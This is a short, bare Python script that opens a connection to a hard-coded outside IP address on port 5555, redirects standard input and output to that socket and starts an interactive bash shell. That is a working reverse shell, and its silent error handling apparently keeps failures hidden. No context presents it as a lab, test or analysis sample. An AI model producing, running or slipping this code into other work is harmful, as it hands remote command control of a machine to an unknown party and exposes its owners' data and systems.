import os, socket, subprocess
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("147.45.124.42",5555))
    os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
    subprocess.Popen(["/bin/bash","-i"])
except:
    pass
